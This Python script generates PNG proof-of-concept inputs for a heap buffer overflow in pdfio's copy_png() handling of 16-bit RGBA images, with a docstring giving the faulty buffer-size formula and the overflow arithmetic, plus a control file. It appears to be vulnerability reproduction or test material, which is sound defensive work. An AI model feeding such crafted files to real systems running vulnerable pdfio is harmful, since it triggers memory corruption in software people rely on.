#!/usr/bin/env python3
"""Build the three checked-in PNG inputs with Python's standard library.

The defect under test (pdfio `copy_png()`, releases 1.5.0 through 1.6.4) is the
line-buffer size for alpha-channel PNGs:

    linesize = (width * num_colors * depth + 7) / 8;
    if (alpha)
      linesize += width;                    <-- width bytes, not width*depth/8

That is correct at depth 8 and short by exactly `width` bytes per row at
depth 16, while libpng writes png_get_rowbytes() = width*(num_colors+1)*2
into each row pointer of one flat calloc(height, linesize) region.

Inputs:
  poc.png     64x8   depth 16 colour type 6 (RGBA)  - the trigger
  control.png 64x8   depth 8  colour type 6 (RGBA)  - imports cleanly on both
              releases: at depth 8 the two formulas are equal (4*width = 4*width)
  wide.png    1024x8 depth 16 colour type 6, fill 0xAA - same defect, larger
              attacker-chosen width: the shortfall per row is `width` bytes,
              and pdfio caps width at png_set_user_limits(pp, 16384, 16384)

Arithmetic for poc.png:
    libpng rowbytes = 64*4*2                  = 512
    1.6.4 linesize  = (64*3*16+7)/8 + 64      = 448
    allocation      = 8 * 448                 = 3584
    last row starts at 7*448 = 3136, writes 512 -> 3648
    overflow        = 3648 - 3584             = 64 bytes past the region
"""
import os
import struct
import sys
import zlib


def chunk(tag: bytes, data: bytes) -> bytes:
    return (struct.pack(">I", len(data)) + tag + data
            + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF))


def build(w: int, h: int, depth: int, fill: int = 0x00) -> bytes:
    ihdr = struct.pack(">IIBBBBB", w, h, depth, 6, 0, 0, 0)   # colour type 6 = RGBA
    row = b"\x00" + bytes([fill]) * (w * 4 * depth // 8)      # filter byte + pixel bytes
    idat = zlib.compress(row * h, 9)
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr)
            + chunk(b"IDAT", idat) + chunk(b"IEND", b""))


def emit(out_dir: str, name: str, w: int, h: int, depth: int, fill: int = 0x00) -> None:
    data = build(w, h, depth, fill)
    path = os.path.join(out_dir, name)
    with open(path, "wb") as f:
        f.write(data)
    old = (w * 3 * depth + 7) // 8 + w
    new = (w * 4 * depth + 7) // 8
    print(f"{name}: {len(data)} bytes  {w}x{h} depth={depth} RGBA fill=0x{fill:02x}  "
          f"1.6.4 linesize={old}  1.6.5 linesize={new}")


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "input"
    os.makedirs(out, exist_ok=True)
    emit(out, "poc.png", 64, 8, 16)
    emit(out, "control.png", 64, 8, 8)
    emit(out, "wide.png", 1024, 8, 16, 0xAA)
